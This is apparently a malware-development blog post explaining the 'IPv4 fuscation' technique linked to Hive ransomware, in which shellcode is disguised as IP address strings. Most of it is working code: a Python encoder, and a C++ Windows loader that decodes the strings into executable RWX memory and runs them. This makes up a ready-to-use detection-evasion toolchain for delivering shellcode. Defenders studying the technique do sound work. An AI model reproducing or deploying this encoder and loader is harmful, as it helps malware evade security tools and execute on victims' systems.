---
title: "IPv4 Fuscation Shellcode Obfuscation"
date: 2026-01-24 00:00:00 +0000
categories: [Maldev , Shellcode Obfuscation]
tags: [Maldev, Shellcode Obfuscation]
---

# IPv4 Fuscation Shellcode Obfuscation
## Intro to IPv4 Fuscation
You might be wondering what on earth this **IPv4 Fuscation** is, to give you a brief intro to this this is a Shellcode Obfuscation Techniques Discovered by **SentinelOne** which they have discovered to have originated from the **Hive Ransomware Group**. 

More on their research can be found here:
 -  [SentinelOne Research](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
 -  [How the Shellcode Obfuscation Logic Works on a Deeper Level](https://www.bleepingcomputer.com/news/security/hive-ransomware-uses-new-ipfuscation-trick-to-hide-payload/)

## How this Obfuscation logic works is:

> **Shellcode → pad → split every 4 bytes → decimal encode → fake IPv4 strings**

1. Input: raw shellcode
- You provide a file containing raw shellcode bytes ( .bin )
```
\xfc\x48\x83\xe4\xf0...
```

2. Padding to 4-byte alignment
- IPv4 addresses need exactly 4 Bytes
- Why padding is needed
	- Shellcode length is often not divisible by 4 so any leftover bytes would break the IPv4 grouping. So the logic used will be the following
	```python
	padding = (4 - length % 4) % 4
    byte_array + b'\x00' * padding
	```
	- This makes the length a multiple of 4
	- Padding uses 0x00

3. Chunking: split into 4-byte blocks
- After padding, the shellcode is processed byte to byte. every 4 bytes become one IPv4 address.
```
Original bytes:
FC 48 83 E4 | F0 E8 C0 00 | 00 00 41 51
```

4. Byte → decimal conversion
- Each byte is converted from hex to decimal
```
0xFC → 252
0x48 → 72
0x83 → 131
0xE4 → 228
```
- Decimal to IP
```
FC 48 83 E4 → "252.72.131.228"
```

5. IPv4 string formatting
So this will keep looping till all the the bytes are covered making a list like the following
```
"252.72.131.228",
"240.232.192.0",
"0.0.65.81"
```

**Here's my code i compiled after going through enough and more repo's and articles:**

### Shellcode Encoding Python Script 
```python
import argparse 
 
def pad_bytes(byte_array):
    length = len(byte_array)
    padding = (4 - length % 4) % 4
    padded_byte_array = byte_array + b'\x00' * padding
    return padded_byte_array
 
def main():
    parser = argparse.ArgumentParser(description='Process shellcode.')
    parser.add_argument('--shellcode', help='Filename containing raw shellcode')
  
    args = parser.parse_args()
    file_path = args.shellcode
 
    if file_path:
        print(f"[+] Encoding shellcode {file_path}")
    else:
        print("Please provide --shellcode argument.")
        exit()
 
    try:
        with open(file_path, 'rb') as file:
            file_bytes = file.read()
    except FileNotFoundError:
        print("[ERROR] File not found or cannot be opened.")
        exit()
 
    padded_byte_array = pad_bytes(file_bytes)
    ip_shellcode = ""
 
    print("std::string ips[] = {",end="")
 
    for i, sc_byte in enumerate(padded_byte_array):
        if (i) % 4 == 0:
            ip_shellcode += '"'
        ip_shellcode += str(sc_byte)
        if (i + 1) % 4 == 0:
            ip_shellcode += '",'
        else:
            ip_shellcode += "."
 
    print(ip_shellcode[:-1],end="")
    print("};")
 
if __name__ == "__main__":
    main()
```

### Shellcode Loader C++
```c++
#include <windows.h>
#include <iostream>
#include <sstream>
#include <vector>
#include <iomanip>
 
std::string ips[] = {"IPv4's"};
 
std::vector<BYTE> convertIPsToByteArray(const std::string ips[], size_t count) {
    std::vector<BYTE> byteArrays;
 
    for (size_t i = 0; i < count; ++i) {
        std::string ip = ips[i];
        std::string octet;
 
        for (char c : ip) {
            if (c == '.') {
                byteArrays.push_back(static_cast<BYTE>(std::stoi(octet)));
                octet.clear();
            }
            else {
                octet += c;
            }
        }
        byteArrays.push_back(static_cast<BYTE>(std::stoi(octet))); // Last octet
    }
 
    return byteArrays;
}
 
 
int main() {
 
    size_t count = sizeof(ips) / sizeof(ips[0]);
    std::vector<BYTE> shellcode = convertIPsToByteArray(ips, count);
 
 
    std::cout << "Executing bytes...\n";
    for (const auto& byteArray : shellcode) {
        std::cout << " 0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byteArray);
    }
 
    std::size_t vectorSize = shellcode.size();
    char* buffer = static_cast<char*>(VirtualAlloc(0, vectorSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
 
    memcpy(buffer, shellcode.data(), vectorSize);
 
    void (*function)();
    function = reinterpret_cast<void (*)()>(buffer);
    function();
 
    return 0;
}
```

